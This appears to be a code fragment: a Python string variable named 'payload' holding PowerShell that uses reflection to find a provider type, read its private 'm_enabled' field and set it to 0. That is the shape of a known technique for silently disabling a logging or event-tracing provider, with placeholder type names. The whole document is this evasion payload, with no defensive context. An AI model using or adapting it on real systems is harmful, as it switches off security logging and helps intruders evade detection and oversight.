payload = """
$t = [Example].Assembly.GetType('OtherProvider')
$f = $t.GetField('m_enabled', 'NonPublic,Instance')
$f.SetValue($provider,0)
"""
